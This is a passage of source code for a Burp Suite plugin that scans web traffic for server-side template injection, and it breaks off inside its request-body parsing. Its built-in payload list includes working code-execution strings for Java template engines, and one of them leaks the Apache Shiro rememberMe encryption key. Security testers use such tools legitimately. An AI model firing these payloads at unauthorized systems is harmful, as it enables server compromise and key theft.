#-- coding:UTF-8 --
# FUZZ Scanner V2.1 - Burp Suite Template Injection Detection Plugin
# FUZZ漏洞检测插件
# 更新:
#   V2.1: 双模式扫描(替换请求体 / 替换参数值), 深度嵌套参数解析,
#         GET->POST请求头修复, Cookie/Header注入支持, Content-Type切换

from burp import IBurpExtender, ITab, IHttpListener, IMessageEditorController, IContextMenuFactory
from java.io import PrintWriter
from java.awt import GridLayout, FlowLayout, BorderLayout, GridBagLayout, GridBagConstraints, Insets
from java.awt.event import ActionEvent, ActionListener
from javax import swing
from javax.swing.table import AbstractTableModel
from java.net import URL

import hashlib
import time
import re
import os
import codecs
import json
from thread import start_new_thread
from threading import Lock

try:
    unicode
except NameError:
    unicode = str

try:
    reload(sys)
    sys.setdefaultencoding('utf8')
except:
    pass

# ---- 扫描模式常量 ----
SCAN_MODE_REPLACE_BODY = 0    # 模式1: 替换整个请求体
SCAN_MODE_REPLACE_PARAMS = 1  # 模式2: 替换参数值

# ---- 全局状态 ----
log = list()           # 主日志列表（每个唯一的被扫描URL一条）
log2 = dict()          # md5 -> 详细测试结果列表（每个POC一条）
log3 = list()          # 当前选中的详细结果
log4_md5 = list()      # 已扫描的MD5去重列表
sent_requests = set()  # 已发送请求hash去重 (mode2避免重复)

currentlyDisplayedItem = None
requestViewer = None
responseViewer = None
secondModel = None
firstModel = None
helpers = None

# 默认POC配置: poc|||match_string
DEFAULT_POC_CONFIG = [
    "fragment=__${7*7}__|||49",
    "fragment=__${#response.getWriter().print('111111')}__::.x|||111111",
    "fragment=__|$${#response.getWriter().print('12345654321')}|__::.x|||12345654321",
    "fragment=__|$${#response.getWriter().print(@securityManager.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x|||=="
]


class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController, IContextMenuFactory):

    def __init__(self):
        self.poc_config = self.load_poc_config()
        self.plugin_dir = self.get_plugin_dir()
        self.isPluginMenu = False

    # ======================== 文件路径 & 加载/保存 ========================

    def get_plugin_dir(self):
        return os.path.expanduser("~")

    def load_poc_config(self):
        """加载POC配置文件 ~/fuzz_scanner.txt，每行格式: poc|||match_string"""
        try:
            self.plugin_dir = self.get_plugin_dir()
            poc_file = os.path.join(self.plugin_dir, "fuzz_scanner.txt")
            if os.path.exists(poc_file):
                try:
                    with codecs.open(poc_file, "r", "utf-8") as f:
                        lines = [line.strip() for line in f if line.strip() and "|||" in line]
                    if lines:
                        try:
                            print(unicode("[+] 成功加载外部fuzz_scanner POC文件 fuzz_scanner.txt，共 %d 条" % len(lines), "utf-8"))
                        except:
                            print("[+] 成功加载外部fuzz_scanner POC文件 fuzz_scanner.txt，共 %d 条" % len(lines))
                        return lines
                except Exception as e:
                    try:
                        with open(poc_file, "r") as f:
                            lines = [line.strip().decode('utf-8', 'ignore') if isinstance(line, str) else line.strip()
                                     for line in f if line.strip() and "|||" in line]
                        if lines:
                            try:
                                print(unicode("[+] 成功加载外部fuzz_scanner POC文件 fuzz_scanner.txt（降级编码），共 %d 条" % len(lines), "utf-8"))
                            except:
                                print("[+] 成功加载外部fuzz_scanner POC文件 fuzz_scanner.txt（降级编码），共 %d 条" % len(lines))
                            return lines
                    except Exception:
                        pass
            try:
                print(unicode("[!] 未找到 fuzz_scanner.txt，使用内置默认POC", "utf-8"))
            except:
                print("[!] 未找到 fuzz_scanner.txt，使用内置默认POC")
            return DEFAULT_POC_CONFIG
        except Exception as e:
            try:
                print(unicode("[!] 读取 fuzz_scanner.txt 出错，使用内置默认POC", "utf-8"))
            except:
                print("[!] 读取 fuzz_scanner.txt 出错，使用内置默认POC")
            return DEFAULT_POC_CONFIG

    def save_poc_config(self, event):
        """保存POC配置到文件"""
        text = self.pocTextArea.getText()
        lines = [line.strip() for line in text.splitlines() if line.strip() and "|||" in line]
        if not lines:
            print("[!] 没有有效的POC配置（每行需包含 ||| 分隔符），未保存")
            return

        poc_file = os.path.join(self.plugin_dir, "fuzz_scanner.txt")
        try:
            with codecs.open(poc_file, "w", "utf-8") as f:
                for line in lines:
                    f.write(line + "\n")
            self.poc_config = lines
            try:
                print(unicode("[+] fuzz_scanner POC配置已保存到: " + poc_file, "utf-8"))
            except:
                print("[+] fuzz_scanner POC配置已保存到: " + poc_file)
            try:
                self.pathLabel.setText(unicode("POC文件路径: " + poc_file, "utf-8"))
            except:
                self.pathLabel.setText("POC文件路径: " + poc_file)
        except Exception as e:
            print("[!] 保存POC配置出错: " + str(e))

    # ======================== Burp 扩展注册 ========================

    def registerExtenderCallbacks(self, callbacks):
        global requestViewer, responseViewer, secondModel, firstModel, helpers
        try:
            print("FUZZ Scanner V2.1 - FUZZ漏洞检测插件\n")
            print("更新日志：")
            print("\t\t V2.1: 双模式扫描(替换请求体/替换参数值), 深度嵌套参数解析")
            print("\t\t       GET->POST请求头修复, Cookie/Header注入支持")
            print("\t\t       Content-Type切换, 追加POC参数模式")
            print("\t\t V1.0: 基于 xiaSQL_Plus 架构")
        except:
            print("FUZZ Scanner V2.1 - FUZZ漏洞检测插件")

        self.callbacks = callbacks
        helpers = callbacks.getHelpers()
        self.helpers = helpers
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        callbacks.setExtensionName(unicode("FUZZ Scanner V2.1", "utf-8"))

        self.lock = Lock()
        self.count = 0

        secondModel = self.SecondModel()
        firstModel = self.FirstModel()

        # ---- 构建UI ----
        self.allPanel = swing.JSplitPane(swing.JSplitPane.HORIZONTAL_SPLIT)
        self.leftPanel = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT)
        self.resultPanel = swing.JSplitPane(swing.JSplitPane.HORIZONTAL_SPLIT)

        # 主表格
        self.firstTable = self.FirstTable(firstModel)
        try:
            self.firstTable.getColumnModel().getColumn(0).setPreferredWidth(25)
            self.firstTable.getColumnModel().getColumn(2).setPreferredWidth(230)
        except:
            pass
        self.firstScrollPane = swing.JScrollPane(self.firstTable)

        # 详情表格
        self.secondTable = self.SecondTable(secondModel)
        self.secondScrollPane = swing.JScrollPane(self.secondTable)

        # 表格面板（左右并排）
        self.tablesPanel = swing.JSplitPane(swing.JSplitPane.HORIZONTAL_SPLIT)
        self.tablesPanel.setLeftComponent(self.firstScrollPane)
        self.tablesPanel.setRightComponent(self.secondScrollPane)
        self.tablesPanel.setResizeWeight(0.5)
        try:
            self.tablesPanel.setDividerLocation(0.5)
        except:
            self.tablesPanel.setDividerLocation(400)

        # ---- 右侧配置面板 ----
        self.rightPanel = swing.JPanel()
        self.rightPanel.setLayout(BorderLayout())

        # 使用 GridBagLayout 更灵活
        self.configPanel = swing.JPanel()
        self.configPanel.setLayout(GridBagLayout())
        c = GridBagConstraints()
        c.fill = GridBagConstraints.HORIZONTAL
        c.insets = Insets(2, 5, 2, 5)
        c.gridx = 0
        c.gridwidth = 1

        # ---- 标题 ----
        c.gridy = 0
        self.label = swing.JLabel(unicode("FUZZ Scanner V2.1 - FUZZ检测", "utf-8"))
        self.configPanel.add(self.label, c)
        c.gridy = 1
        self.label00 = swing.JLabel(unicode("双模式 | 深度嵌套解析 | Cookie/Header注入", "utf-8"))
        self.configPanel.add(self.label00, c)

        # ---- 插件总开关 ----
        c.gridy = 2
        self.chkbox_enable = swing.JCheckBox(unicode("启用插件", "utf-8"), selected=False)
        self.configPanel.add(self.chkbox_enable, c)

        # ---- 扫描模式选择 ----
        c.gridy = 3
        modePanel = swing.JPanel(FlowLayout(FlowLayout.LEFT, 0, 0))
        modePanel.add(swing.JLabel(unicode("扫描模式: ", "utf-8")))
        self.scanModeCombo = swing.JComboBox([
            unicode("模式1: 替换整个请求体 (GET自动转POST)", "utf-8"),
            unicode("模式2: 替换参数值 (保持原始请求结构)", "utf-8")
        ])
        self.scanModeCombo.setSelectedIndex(0)
        modePanel.add(self.scanModeCombo)
        self.configPanel.add(modePanel, c)

        # ---- 模式1: Content-Type 选择 ----
        c.gridy = 4
        ctPanel = swing.JPanel(FlowLayout(FlowLayout.LEFT, 0, 0))
        ctPanel.add(swing.JLabel(unicode("Mode1 Body类型: ", "utf-8")))
        self.contentTypeCombo = swing.JComboBox([
            "application/x-www-form-urlencoded",
            "application/json",
            "text/plain"
        ])
        ctPanel.add(self.contentTypeCombo)
        self.configPanel.add(ctPanel, c)

        # ---- 模式2: 高级选项 ----
        c.gridy = 5
        mode2Label = swing.JLabel(unicode("--- 模式2 高级选项 ---", "utf-8"))
        self.configPanel.add(mode2Label, c)

        c.gridy = 6
        self.chkbox_inject_cookie = swing.JCheckBox(unicode("注入Cookie参数 (Mode2)", "utf-8"), selected=False)
        self.configPanel.add(self.chkbox_inject_cookie, c)

        c.gridy = 7
        self.chkbox_inject_header = swing.JCheckBox(unicode("注入Header参数 (Mode2)", "utf-8"), selected=False)
        self.configPanel.add(self.chkbox_inject_header, c)

        c.gridy = 8
        self.chkbox_full_poc = swing.JCheckBox(unicode("使用完整POC字符串作为替换值 (Mode2)", "utf-8"), selected=True)
        self.chkbox_full_poc.setToolTipText(unicode("开启: 参数值替换为完整POC | 关闭: 仅用提取的payload值", "utf-8"))
        self.configPanel.add(self.chkbox_full_poc, c)

        c.gridy = 9
        self.chkbox_append_poc = swing.JCheckBox(unicode("追加POC参数到请求 (Mode2)", "utf-8"), selected=True)
        self.chkbox_append_poc.setToolTipText(unicode("在保留原参数基础上追加POC的key=value结构", "utf-8"))
        self.configPanel.add(self.chkbox_append_poc, c)

        c.gridy = 10
        self.chkbox_preserve_value = swing.JCheckBox(unicode("保留原始值再拼接Payload (Mode2)", "utf-8"), selected=False)
        self.chkbox_preserve_value.setToolTipText(unicode("开启: username=admin+Payload | 关闭: username=Payload (直接替换)", "utf-8"))
        self.configPanel.add(self.chkbox_preserve_value, c)

        c.gridy = 11
        self.chkbox_url_encode = swing.JCheckBox(unicode("URL编码替换值 (Mode2)", "utf-8"), selected=False)
        self.chkbox_url_encode.setToolTipText(unicode("开启: payload值会进行URL编码 | 关闭: 保留原始字符便于观察", "utf-8"))
        self.configPanel.add(self.chkbox_url_encode, c)

        # ---- 监控选项 ----
        c.gridy = 12
        monitorPanel = swing.JPanel(FlowLayout(FlowLayout.LEFT, 0, 0))
        self.chkbox2 = swing.JCheckBox(unicode("监控 Repeater", "utf-8"))
        self.chkbox3 = swing.JCheckBox(unicode("监控 Proxy", "utf-8"))
        self.chkbox3.setSelected(True)
        monitorPanel.add(self.chkbox2)
        monitorPanel.add(self.chkbox3)
        self.configPanel.add(monitorPanel, c)

        # ---- 白名单设置 ----
        c.gridy = 13
        self.label2 = swing.JLabel(unicode("白名单域名请用,隔开（不检测）", "utf-8"))
        self.configPanel.add(self.label2, c)
        c.gridy = 14
        try:
            self.textField = swing.JTextField(unicode(".*google.*,.*baidu.com", "utf-8"))
        except:
            self.textField = swing.JTextField(".*google.*,.*baidu.com")
        self.configPanel.add(self.textField, c)
        c.gridy = 15
        self.chkbox4 = swing.JCheckBox(unicode("启动域名白名单", "utf-8"))
        self.chkbox4.setSelected(True)
        self.configPanel.add(self.chkbox4, c)

        # ---- POC文件路径 ----
        c.gridy = 16
        self.pathLabel = swing.JLabel(
            unicode("POC文件路径: " + os.path.join(self.plugin_dir, "fuzz_scanner.txt"), "utf-8"))
        self.configPanel.add(self.pathLabel, c)

        # ---- 清空按钮 ----
        c.gridy = 17
        self.btn1 = swing.JButton(unicode("清空记录", "utf-8"), actionPerformed=self.clearLog)
        self.configPanel.add(self.btn1, c)

        # 包装configPanel
        configWrapper = swing.JPanel(BorderLayout())
        configWrapper.add(self.configPanel, BorderLayout.NORTH)
        self.rightPanel.add(configWrapper, BorderLayout.NORTH)

        # ---- POC编辑区域 ----
        self.pocPanel = swing.JPanel()
        self.pocPanel.setLayout(BorderLayout())
        self.pocLabel = swing.JLabel(unicode("POC列表 (格式: poc|||匹配字符串)", "utf-8"))
        self.pocTextArea = swing.JTextArea()
        self.pocTextArea.setText("\n".join(self.poc_config))
        self.pocScrollPane = swing.JScrollPane(self.pocTextArea)
        self.pocButtonPanel = swing.JPanel()
        self.pocButtonPanel.setLayout(FlowLayout(FlowLayout.CENTER))
        self.savePocButton = swing.JButton(unicode("保存POC", "utf-8"), actionPerformed=self.save_poc_config)
        self.pocButtonPanel.add(self.savePocButton)
        self.pocPanel.add(self.pocLabel, BorderLayout.NORTH)
        self.pocPanel.add(self.pocScrollPane, BorderLayout.CENTER)
        self.pocPanel.add(self.pocButtonPanel, BorderLayout.SOUTH)
        self.rightPanel.add(self.pocPanel, BorderLayout.CENTER)

        # ---- 请求/响应查看器 ----
        requestViewer = callbacks.createMessageEditor(self, False)
        responseViewer = callbacks.createMessageEditor(self, False)
        self.resultPanel.add(requestViewer.getComponent())
        self.resultPanel.add(responseViewer.getComponent())
        self.resultPanel.setDividerLocation(550)

        # ---- 组合面板 ----
        self.leftPanel.setTopComponent(self.tablesPanel)
        self.leftPanel.setBottomComponent(self.resultPanel)
        try:
            self.leftPanel.setDividerLocation(0.5)
        except:
            self.leftPanel.setDividerLocation(400)

        self.allPanel.setLeftComponent(self.leftPanel)
        self.allPanel.setRightComponent(self.rightPanel)
        self.allPanel.setDividerLocation(1100)

        # 自定义UI
        callbacks.customizeUiComponent(self.allPanel)
        callbacks.customizeUiComponent(self.leftPanel)
        callbacks.customizeUiComponent(self.tablesPanel)
        callbacks.customizeUiComponent(self.firstTable)
        callbacks.customizeUiComponent(self.secondTable)
        callbacks.customizeUiComponent(self.firstScrollPane)
        callbacks.customizeUiComponent(self.secondScrollPane)
        callbacks.customizeUiComponent(self.rightPanel)
        callbacks.customizeUiComponent(self.resultPanel)

        callbacks.addSuiteTab(self)
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)

    # ======================== Tab 接口 ========================

    def getTabCaption(self):
        return "fuzz_scanner"

    def getUiComponent(self):
        return self.allPanel

    # ======================== 右键菜单 ========================

    def createMenuItems(self, invocation):
        jMenu = swing.JMenuItem("Send to fuzz_scanner")

        def actionPerformed(event):
            self.isPluginMenu = True
            start_new_thread(self.checkfuzz_scanner, (invocation.getSelectedMessages()[0], 1024,))

        jMenu.addActionListener(actionPerformed)
        ret = list()
        ret.append(jMenu)
        return ret

    # ======================== HTTP 流量监听 ========================

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        try:
            if not hasattr(self, 'chkbox_enable') or not self.chkbox_enable.isSelected():
                return

            if messageIsRequest != 0:
                return
            if not hasattr(self, 'chkbox2') or not hasattr(self, 'chkbox3'):
                return

            toolName = None
            try:
                toolName = self.callbacks.getToolName(toolFlag)
            except Exception:
                toolName = None

            repeater_flag = False
            proxy_flag = False

            if toolName:
                tn = toolName.lower()
                repeater_flag = ('repeater' in tn)
                proxy_flag = ('proxy' in tn)
            else:
                repeater_flag = (toolFlag == 64)
                proxy_flag = (toolFlag == 4) or (toolFlag == 16)

            if (repeater_flag and self.chkbox2.isSelected()) or (proxy_flag and self.chkbox3.isSelected()):
                start_new_thread(self.checkfuzz_scanner, (messageInfo, toolFlag,))

        except Exception as e:
            try:
                print("processHttpMessage exception: %s" % str(e))
            except:
                pass

    # ======================== 核心检测逻辑（入口） ========================

    def checkfuzz_scanner(self, baseRequestResponse, toolFlag):
        global secondModel, firstModel, helpers, log4_md5, log, sent_requests

        analyResult = helpers.analyzeRequest(baseRequestResponse)
        data_url = analyResult.getUrl().toString()
        method = analyResult.getMethod()

        # 提取纯路径（去掉 query string）
        temp_data_strarray = data_url.split("?")
        purity_url = temp_data_strarray[0]

        # ---- 白名单检查 ----
        try:
            if self.chkbox4.isSelected():
                whitle_URL_list = self.textField.getText().split(",")
                for each in whitle_URL_list:
                    httpEach = 'https?://' + each
                    if re.match(httpEach, purity_url):
                        return
        except Exception:
            pass

        # ---- 静态文件过滤 ----
        try:
            if toolFlag == 4 or toolFlag == 64 or toolFlag == 16:
                static_file = {"jpg", "png", "bmp", "ico", "gif", "css", "js", "map",
                               "pdf", "mp3", "mp4", "avi", "svg", "woff2", "woff", "otf",
                               "ttf", "eot", "webp", "jpeg", "zip", "gz", "tar", "rar"}
                static_file_1 = purity_url.split(".")
                static_file_2 = static_file_1[-1].lower()
                for each in static_file:
                    if each == static_file_2:
                        return
        except Exception:
            pass

        # ---- 去重: MD5(method + 路径) ----
        str_for_md5 = method + ' ' + purity_url

        if toolFlag == 1024 and self.isPluginMenu:
            str_for_md5 += str(time.time())
            self.isPluginMenu = False

        str_md5 = self.getMd5(str_for_md5)

        self.lock.acquire()
        try:
            if str_md5 in log4_md5:
                return
            log4_md5.append(str_md5)
        finally:
            try:
                self.lock.release()
            except:
                pass

        # 记录原始响应长度
        totalRes = helpers.bytesToString(baseRequestResponse.getResponse())
        if totalRes is None:
            totalRes = ""
        try:
            dataOffset = totalRes.find("\r\n\r\n")
            if dataOffset > 0:
                original_data_len = len(totalRes) - dataOffset - 4
            else:
                original_data_len = 0
        except Exception:
            original_data_len = 0

        # 添加到主日志
        log.append(self.LogEntry(self.count, baseRequestResponse, analyResult.getUrl(),
                                 "", "", "", str_md5, "", "scanning...", 999, original_data_len))
        self.count += 1
        try:
            firstModel.fireTableRowsInserted(len(log), len(log))
        except:
            pass

        # ---- 获取扫描模式 ----
        scan_mode = self.scanModeCombo.getSelectedIndex()

        # ---- 清空本轮 sent_requests ----
        sent_requests.clear()

        # ---- 根据模式执行扫描 ----
        vuln_found = False
        if scan_mode == SCAN_MODE_REPLACE_BODY:
            vuln_found = self._scan_mode_replace_body(baseRequestResponse, analyResult, str_md5)
        else:
            vuln_found = self._scan_mode_replace_params(baseRequestResponse, analyResult, str_md5)

        # ---- 更新主日志状态 ----
        try:
            for logEntry in log:
                if str_md5 == logEntry.data_md5:
                    if vuln_found:
                        logEntry.setState("Vulnerable!")
                    else:
                        logEntry.setState("Clean")
        except Exception:
            pass

        # ---- 刷新表格 ----
        try:
            nowRow = self.firstTable.getSelectedRow()
        except:
            nowRow = -1
        try:
            firstModel.fireTableRowsInserted(len(log), len(log))
            firstModel.fireTableDataChanged()
        except:
            pass
        try:
            if nowRow >= 0 and nowRow < len(log):
                self.firstTable.setRowSelectionInterval(nowRow, nowRow)
        except:
            pass

    # ======================== 模式1: 替换整个请求体 ========================

    def _scan_mode_replace_body(self, baseRequestResponse, analyResult, str_md5):
        """模式1: 清空请求体，替换为POC。GET自动转POST。"""
        global helpers, log2

        iHttpService = baseRequestResponse.getHttpService()
        headers = analyResult.getHeaders()
        method = analyResult.getMethod()
        url_obj = analyResult.getUrl()
        path = url_obj.getPath() if url_obj.getPath() else "/"

        # ---- 获取选定的Content-Type ----
        selected_ct = self.contentTypeCombo.getSelectedItem()

        # ---- 构建新的请求头 ----
        new_headers = []
        request_line_set = False
        for h in headers:
            hl = h.lower()
            # 跳过原始请求行（Method + Path + Version）
            if not request_line_set and (h.startswith("GET ") or h.startswith("POST ") or
                                          h.startswith("PUT ") or h.startswith("DELETE ") or
                                          h.startswith("PATCH ") or h.startswith("HEAD ") or
                                          h.startswith("OPTIONS ")):
                # FIX: 修复GET->POST请求头bug — 正确替换请求行
                new_headers.append("POST " + path + " HTTP/1.1")
                request_line_set = True
                continue
            if hl.startswith("content-type:") or hl.startswith("content-length:") or hl.startswith("transfer-encoding:"):
                continue
            new_headers.append(h)

        # 确保请求行存在（极端情况）
        if not request_line_set:
            new_headers.insert(0, "POST " + path + " HTTP/1.1")

        # 添加选定的 Content-Type
        new_headers.append("Content-Type: " + selected_ct)

        vuln_found = False

        # ---- 遍历POC ----
        for poc_line in self.poc_config:
            if "|||" not in poc_line:
                continue
            parts = poc_line.split("|||", 1)
            poc = parts[0].strip()
            match_str = parts[1].strip() if len(parts) > 1 else ""

            if not poc or not match_str:
                continue

            try:
                # 构建新请求: POST + 自定义Content-Type + body = POC
                newRequest = helpers.buildHttpMessage(new_headers, poc)

                time_1 = time.time() * 1000
                requestResponse = self.callbacks.makeHttpRequest(iHttpService, newRequest)
                time_2 = time.time() * 1000

                nowRes = helpers.bytesToString(requestResponse.getResponse())
                if nowRes is None:
                    nowRes = ""

                nowOffset = nowRes.find("\r\n\r\n")
                if nowOffset > 0:
                    nowLen = len(nowRes) - nowOffset - 4
                else:
                    nowLen = 0

                statusCode = 0
                try:
                    statusCode = helpers.analyzeResponse(requestResponse.getResponse()).getStatusCode()
                except:
                    pass

                diffTime = int(time_2 - time_1)

                result = "Not Found"
                if match_str in nowRes:
                    result = "Found!"
                    vuln_found = True

                if str_md5 not in log2:
                    log2[str_md5] = []
                log2[str_md5].append(
                    self.LogEntry(self.count, requestResponse,
                                  helpers.analyzeRequest(requestResponse).getUrl(),
                                  poc, match_str, result, str_md5, diffTime, "end",
                                  statusCode, nowLen))

            except Exception as e:
                try:
                    if str_md5 not in log2:
                        log2[str_md5] = []
                    log2[str_md5].append(
                        self.LogEntry(self.count, None,
                                      analyResult.getUrl(),
                                      poc, match_str, "Error: " + str(e)[:50],
                                      str_md5, 0, "end", 0, 0))
                except:
                    pass

        return vuln_found

    # ======================== 模式2: 替换参数值 ========================

    def _scan_mode_replace_params(self, baseRequestResponse, analyResult, str_md5):
        """模式2: 保持请求结构，替换每个叶子参数的值为POC。支持深度嵌套。"""
        global helpers, log2, sent_requests

        iHttpService = baseRequestResponse.getHttpService()
        request_bytes = baseRequestResponse.getRequest()
        method = analyResult.getMethod()
        headers = analyResult.getHeaders()
        url_obj = analyResult.getUrl()

        # ---- 获取选项 ----
        inject_cookie = self.chkbox_inject_cookie.isSelected()
        inject_header = self.chkbox_inject_header.isSelected()
        use_full_poc = self.chkbox_full_poc.isSelected()
        append_poc = self.chkbox_append_poc.isSelected()

        # ---- 获取原始body ----
        body_offset = analyResult.getBodyOffset()
        raw_body_bytes = request_bytes[body_offset:]
        raw_body_str = helpers.bytesToString(raw_body_bytes)

        # ---- 获取Content-Type ----
        content_type = self._get_content_type_category(headers)

        # ---- 提取所有叶子参数 ----
        all_params = self._extract_all_params(
            analyResult, headers, raw_body_str, content_type,
            include_cookie=inject_cookie, include_header=inject_header
        )

        # ---- 调试输出：显示提取到的参数 ----
        try:
            param_paths = [p["path"] for p in all_params]
            print("[fuzz_scanner] [Mode2] 提取到 %d 个参数: %s | Content-Type: %s" % (
                len(all_params), str(param_paths), content_type))
        except:
            pass

        if not all_params:
            # 没有可替换的参数，尝试追加模式
            if append_poc:
                return self._scan_mode_append_only(baseRequestResponse, analyResult, str_md5)
            return False

        vuln_found = False

        # ---- 遍历每个POC ----
        for poc_line in self.poc_config:
            if "|||" not in poc_line:
                continue
            parts = poc_line.split("|||", 1)
            poc_full = parts[0].strip()
            match_str = parts[1].strip() if len(parts) > 1 else ""

            if not poc_full or not match_str:
                continue

            # 提取PoC中的payload值
            poc_values = self._extract_poc_values(poc_full)

            # ---- 对每个叶子参数进行替换测试 ----
            for param_info in all_params:
                param_path = param_info["path"]
                param_location = param_info["location"]

                # ---- 策略A: 用提取的payload值替换 ----
                for pv in poc_values:
                    try:
                        new_req = self._build_param_replaced_request(
                            baseRequestResponse, analyResult, headers,
                            raw_body_str, content_type, param_info, pv
                        )
                        if new_req is None:
                            continue

                        # 去重检查
                        req_hash = self.getMd5(helpers.bytesToString(new_req))
                        if req_hash in sent_requests:
                            continue
                        sent_requests.add(req_hash)

                        found = self._send_and_check(
                            iHttpService, new_req, match_str, str_md5,
                            analyResult.getUrl(), poc_full, param_path
                        )
                        if found:
                            vuln_found = True
                    except Exception:
                        pass

                # ---- 策略B: 用完整POC字符串替换 ----
                if use_full_poc:
                    try:
                        new_req = self._build_param_replaced_request(
                            baseRequestResponse, analyResult, headers,
                            raw_body_str, content_type, param_info, poc_full
                        )
                        if new_req is None:
                            continue

                        req_hash = self.getMd5(helpers.bytesToString(new_req))
                        if req_hash in sent_requests:
                            continue
                        sent_requests.add(req_hash)

                        found = self._send_and_check(
                            iHttpService, new_req, match_str, str_md5,
                            analyResult.getUrl(), poc_full + " [full]", param_path
                        )
                        if found:
                            vuln_found = True
                    except Exception:
                        pass

            # ---- 策略C: 追加POC参数到请求 ----
            if append_poc:
                poc_form_params = self._parse_poc_as_form(poc_full)
                if poc_form_params:
                    try:
                        new_req = self._build_append_request(
                            baseRequestResponse, analyResult, headers,
                            raw_body_str, content_type, poc_form_params
                        )
                        if new_req is not None:
                            req_hash = self.getMd5(helpers.bytesToString(new_req))
                            if req_hash not in sent_requests:
                                sent_requests.add(req_hash)
                                found = self._send_and_check(
                                    iHttpService, new_req, match_str, str_md5,
                                    analyResult.getUrl(), poc_full + " [append]", "APPEND"
                                )
                                if found:
                                    vuln_found = True
                    except Exception:
                        pass

        return vuln_found

    def _scan_mode_append_only(self, baseRequestResponse, analyResult, str_md5):
        """当没有可替换参数时，仅使用追加模式测试"""
        global helpers, log2, sent_requests

        iHttpService = baseRequestResponse.getHttpService()
        headers = analyResult.getHeaders()
        body_offset = analyResult.getBodyOffset()
        raw_body_str = helpers.bytesToString(baseRequestResponse.getRequest()[body_offset:])
        content_type = self._get_content_type_category(headers)

        vuln_found = False

        for poc_line in self.poc_config:
            if "|||" not in poc_line:
                continue
            parts = poc_line.split("|||", 1)
            poc_full = parts[0].strip()
            match_str = parts[1].strip() if len(parts) > 1 else ""

            if not poc_full or not match_str:
                continue

            poc_form_params = self._parse_poc_as_form(poc_full)
            if poc_form_params:
                try:
                    new_req = self._build_append_request(
                        baseRequestResponse, analyResult, headers,
                        raw_body_str, content_type, poc_form_params
                    )
                    if new_req is not None:
                        req_hash = self.getMd5(helpers.bytesToString(new_req))
                        if req_hash not in sent_requests:
                            sent_requests.add(req_hash)
                            found = self._send_and_check(
                                iHttpService, new_req, match_str, str_md5,
                                analyResult.getUrl(), poc_full + " [append-only]", "APPEND"
                            )
                            if found:
                                vuln_found = True
                except Exception:
                    pass

        return vuln_found

    def _send_and_check(self, iHttpService, newRequest, match_str, str_md5, url, poc_label, param_path):
        """发送请求并检查匹配，写入log2。返回是否发现漏洞。"""
        global helpers, log2

        time_1 = time.time() * 1000
        requestResponse = self.callbacks.makeHttpRequest(iHttpService, newRequest)
        time_2 = time.time() * 1000

        nowRes = helpers.bytesToString(requestResponse.getResponse())
        if nowRes is None:
            nowRes = ""

        nowOffset = nowRes.find("\r\n\r\n")
        if nowOffset > 0:
            nowLen = len(nowRes) - nowOffset - 4
        else:
            nowLen = 0

        statusCode = 0
        try:
            statusCode = helpers.analyzeResponse(requestResponse.getResponse()).getStatusCode()
        except:
            pass

        diffTime = int(time_2 - time_1)

        result = "Not Found"
        vuln_found = False
        if match_str in nowRes:
            result = "Found!"
            vuln_found = True

        if str_md5 not in log2:
            log2[str_md5] = []
        log2[str_md5].append(
            self.LogEntry(self.count, requestResponse,
                          helpers.analyzeRequest(requestResponse).getUrl(),
                          poc_label, match_str,
                          result + " [" + param_path + "]",
                          str_md5, diffTime, "end",
                          statusCode, nowLen))

        return vuln_found

    # ======================== 参数提取 ========================

    def _extract_all_params(self, analyResult, headers, body_str, content_type,
                            include_cookie=False, include_header=False):
        """
        从请求中提取所有叶子参数。
        返回: [{"path": "key", "value": "val", "location": "query"|"body"|"cookie"|"header"}, ...]
        """
        all_params = []

        # ---- 1. URL Query String 参数 ----
        url_obj = analyResult.getUrl()
        query = url_obj.getQuery()
        if query:
            for key, val in self._parse_query_string(query):
                all_params.append({
                    "path": key,
                    "value": val,
                    "location": "query"
                })

        # ---- 2. Body 参数 (基于Content-Type深度解析) ----
        if body_str and body_str.strip():
            body_params = self._extract_body_params(body_str, content_type)
            all_params.extend(body_params)

        # ---- 3. Cookie 参数 (可选) ----
        if include_cookie:
            for h in headers:
                if h.lower().startswith("cookie:"):
                    cookie_str = h.split(":", 1)[1].strip()
                    for key, val in self._parse_cookie_string(cookie_str):
                        all_params.append({
                            "path": "Cookie:" + key,
                            "value": val,
                            "location": "cookie"
                        })
                    break

        # ---- 4. Header 参数 (可选) ----
        if include_header:
            # 跳过这些header不做注入
            skip_headers = {"host", "content-type", "content-length", "accept",
                            "accept-encoding", "accept-language", "connection",
                            "cache-control", "pragma", "transfer-encoding", "origin",
                            "referer", "user-agent", "cookie", "authorization"}
            for h in headers:
                if ":" in h:
                    # 跳过请求行
                    if h.startswith("GET ") or h.startswith("POST ") or h.startswith("PUT ") or \
                       h.startswith("DELETE ") or h.startswith("PATCH ") or h.startswith("HEAD ") or \
                       h.startswith("OPTIONS "):
                        continue
                    hname = h.split(":", 1)[0].strip()
                    hvalue = h.split(":", 1)[1].strip()
                    if hname.lower() not in skip_headers and hvalue:
                        all_params.append({
                            "path": hname,
                            "value": hvalue,
                            "location": "header"
                        })

        return all_params

    def _extract_body_params(self, body_str, content_type):
        """
        根据Content-Type深度解析body中的参数。
        支持: form-urlencoded, JSON, 混合(值中嵌套JSON), multipart
        返回: [{"path": ..., "value": ..., "location": "body"}, ...]
        """
        params = []

        if content_type == "json":
            # 纯JSON body: 使用字符串扫描器（完美处理重复key）
            parsed = False
            for attempt in [body_str, self._safe_url_decode(body_str)]:
                if not attempt or parsed:
                    continue
                try:
                    leaves = self._scan_json_leaves(attempt)
                    for leaf in leaves:
                        params.append({
                            "path": leaf["path"],
                            "value": leaf["value"],
                            "location": "body"
                        })
                    parsed = True
                except:
                    pass

        elif content_type == "form":
            # form-urlencoded: key=value&key2={"nested":"val"}
            form_params = self._parse_query_string(body_str)
            for key, val in form_params:
                # 添加原始form参数
                params.append({
                    "path": key,
                    "value": val,
                    "location": "body"
                })
                # 尝试解析值为JSON，提取深层嵌套参数
                json_nested = self._try_parse_json_value(val)
                if json_nested:
                    for nested_path, nested_val in json_nested:
                        full_path = key + "." + nested_path
                        params.append({
                            "path": full_path,
                            "value": nested_val,
                            "location": "body"
                        })

        elif content_type == "multipart":
            # multipart/form-data
